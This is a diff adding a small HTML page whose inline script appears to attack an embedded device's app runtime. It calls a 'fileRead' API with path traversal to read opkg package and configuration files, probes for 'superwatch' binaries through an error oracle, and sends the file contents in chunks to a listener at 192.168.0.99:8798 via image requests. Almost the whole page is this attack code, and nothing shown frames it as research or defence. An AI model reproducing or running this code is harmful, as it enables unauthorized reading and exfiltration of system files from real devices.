@@ -1,0 +1,18 @@
+<!doctype html><html><head><meta charset="utf-8"></head>
+<body style="background:#000;color:#0f0;font:16px monospace"><pre id="out">u7w9…</pre>
+<script>
+(function(){var out=document.getElementById("out");
+function exfil(t){try{new Image().src="http://192.168.0.99:8798/n?d="+encodeURIComponent(String(t).slice(0,140));}catch(e){}}
+function line(t){out.textContent+="\n"+t;exfil(t);}
+function hi(a,p){try{return HiUtils_createRequest(a,p);}catch(e){return {exc:String(e)};}}
+// opkg status db first lines reveal Architecture accepted values? try /APPS/pkgs/opkgmeta/status (text)
+["../APPS/pkgs/opkgmeta/status","../tmp/opkg.conf","../APPS/etc/opkg/opkg.conf"].forEach(function(p){
+  var j=hi("fileRead",{path:[p],mode:6}); line(p+" ret="+j.ret+" len="+String(j.msg||"").length);
+  if(j.ret===true){var s=String(j.msg); for(var i=0;i<Math.min(s.length,420);i+=140) exfil(s.slice(i,i+140));}
+});
+// superwatchd binary presence (existence only via ENOENT/EISDIR oracle — do NOT read ELF bytes)
+["../usr/bin/superwatch","../sbin/superwatch","../usr/sbin/superwatch"].forEach(function(p){
+  var j=hi("fileRead",{path:[p],mode:6}); line(p+" -> "+((j.msg&&j.msg.code)||typeof j.msg));
+});
+})();
+</script></body></html>
